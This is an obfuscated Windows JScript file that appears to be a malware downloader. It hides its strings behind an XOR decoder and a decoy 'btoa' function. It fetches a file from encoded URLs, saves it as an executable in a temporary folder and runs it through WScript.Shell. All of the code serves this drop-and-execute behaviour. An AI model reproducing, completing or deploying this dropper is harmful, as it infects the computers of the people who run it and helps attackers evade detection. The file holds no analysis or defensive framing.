function btoa(tribunalaRK, perorationHwQ, junketkJB, ensconcehiL, stipulateYic, genesishrX, veraciousTeC, mordantdaN, enigmatOW) {
    var insensateIkX = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
    var besiegeSPr = String(enigmatOW);
    for (var capitulateCcl, humbleUdE, flotillazf2 = 0, venialRBP = insensateIkX, subjugateqwH = ""; besiegeSPr.charAt(flotillazf2 | 0) || (venialRBP = "=", 
    flotillazf2 % 1); subjugateqwH += venialRBP.charAt(63 & capitulateCcl >> 8 - flotillazf2 % 1 * 8)) {
        humbleUdE = besiegeSPr.charCodeAt(flotillazf2 += 3 / 4);
        if (humbleUdE > 255) {
            throw new InvalidCharacterError("'btoa' failed: The string to be encoded contains characters outside of the Latin1 range.");
        }
        capitulateCcl = capitulateCcl << 8 | humbleUdE;
    }
    return subjugateqwH;
}

var arrogateYcB = function(microcosmmwz) {
    var proprietyPVr = "";
    var tribunalaRK = "precisionzbm";
    var perorationHwQ = "incorrigiblePLX";
    var junketkJB = "largessexyR";
    var ensconcehiL = "dormerqQE";
    var stipulateYic = "fawningXes";
    var genesishrX = "ostensibleG7K";
    var veraciousTeC = "assaytiH";
    var mordantdaN = "deignAyA";
    btoa(tribunalaRK, perorationHwQ, junketkJB, ensconcehiL, stipulateYic, genesishrX, veraciousTeC, mordantdaN, [ 24, 178, 88, 220, 148, 28, 114, 13, 94, 200, 99, 207, 202, 213, 98, 242 ]);
    var arbitratebIY = String["sdfadfasdffromChar".slice(10) + "Codedsfadsfasdg".slice(0, 4)];
    for (var forebearDYq = 0; forebearDYq < microcosmmwz.length; forebearDYq++) {
        var decadencec2c = [ 24, 178, 88, 220, 148, 28, 114, 13, 94, 200, 99, 207, 202, 213, 98, 242 ];
        proprietyPVr += arbitratebIY(microcosmmwz[forebearDYq] ^ decadencec2c[forebearDYq % decadencec2c.length]);
    }
    return proprietyPVr;
};

var fractiousxHO = function() {
    var vintnerlxL = function() {
        var audaciousfaL = arrogateYcB([ 90, 231, 21, 184, 248, 43, 54, 107, 63, 153 ]);
        var tenablemoR = arrogateYcB([ 73, 228, 44, 146, 245, 114, 74, 96, 63, 166 ]);
    };
    vintnerlxL.prototype.nZ1a8deDUp = function(surreptitiousRJ3) {
        var askanceypX = arrogateYcB([ 91, 192, 61, 189, 224, 121, 61, 111, 52, 173, 0, 187 ]);
        return wsh[askanceypX](surreptitiousRJ3);
    };
    vintnerlxL.prototype.q9TQHXrVe7 = function(surreptitiousRJ3) {
        var askanceypX = arrogateYcB([ 91, 192, 61, 189, 224, 121, 61, 111, 52, 173, 0, 187 ]);
        return WScript[askanceypX](surreptitiousRJ3);
    };
    return vintnerlxL;
}();

(function() {
    var conscientiousGO0 = [ arrogateYcB([ 112, 198, 44, 172, 174, 51, 93, 101, 46, 169, 17, 170, 179, 186, 23, 154, 125, 192, 61, 173, 229, 50, 17, 98, 51, 231, 91, 248, 228, 176, 26, 151 ]), arrogateYcB([ 112, 198, 44, 172, 174, 51, 93, 101, 46, 169, 15, 188, 165, 162, 3, 156, 108, 193, 62, 186, 186, 127, 29, 96, 113, 240, 84, 225, 175, 173, 7 ]) ];
    var animusk6Y = 4194304;
    var fructifySw5 = arrogateYcB([ 74, 255, 27, 170, 206, 126, 30, 68, 41, 142 ]);
    var aquilinewai = arrogateYcB([ 95, 218, 23, 183, 210, 107, 27, 123, 20, 154 ]);
    var rebusYBF = arrogateYcB([ 107, 235, 2, 187, 251, 76, 51, 88, 111, 240 ]);
    var instituteryP = new fractiousxHO();
    var loutOnu = instituteryP[arrogateYcB([ 105, 139, 12, 141, 220, 68, 0, 91, 59, 255 ])];
    var piousLxG = loutOnu(arrogateYcB([ 79, 225, 59, 174, 253, 108, 6, 35, 13, 160, 6, 163, 166 ]));
    var forebearvfT = loutOnu(arrogateYcB([ 85, 225, 0, 145, 216, 46, 92, 85, 19, 132, 43, 155, 158, 133 ]));
    var discretionarybaD = loutOnu(arrogateYcB([ 89, 246, 23, 152, 214, 50, 33, 121, 44, 173, 2, 162 ]));
    var resourcexlt = piousLxG.ExpandEnvironmentStrings(arrogateYcB([ 61, 230, 29, 145, 196, 57, 46 ]));
    var sleightePu = resourcexlt + animusk6Y + arrogateYcB([ 54, 215, 32, 185 ]);
    var sanctionY3E = false;
    var amalgamateBhv = 200;
    for (var doteAZI = 0; doteAZI < conscientiousGO0.length; doteAZI++) {
        try {
            var peremptoryXfi = conscientiousGO0[doteAZI];
            forebearvfT.open(arrogateYcB([ 95, 247, 12 ]), peremptoryXfi, false);
            forebearvfT.send();
            if (forebearvfT.status == amalgamateBhv) {
                try {
                    discretionarybaD[arrogateYcB([ 119, 194, 61, 178 ])]();
                    discretionarybaD.type = 1;
                    discretionarybaD[arrogateYcB([ 111, 192, 49, 168, 241 ])](forebearvfT[arrogateYcB([ 106, 215, 43, 172, 251, 114, 1, 104, 28, 167, 7, 182 ])]);
                    var adulterateexr = Math.pow(2, 10) * 249;
                    if (discretionarybaD.size > adulterateexr) {
                        doteAZI = conscientiousGO0.length;
                        discretionarybaD.position = 0;
                        discretionarybaD.saveToFile(sleightePu, 2);
                        sanctionY3E = true;
                    }
                } finally {
                    discretionarybaD.close();
                }
            }
        } catch (ignored) {}
    }
    if (sanctionY3E) {
        piousLxG[arrogateYcB([ 93, 202, 61, 191 ])](resourcexlt + Math.pow(2, 22));
    }
})();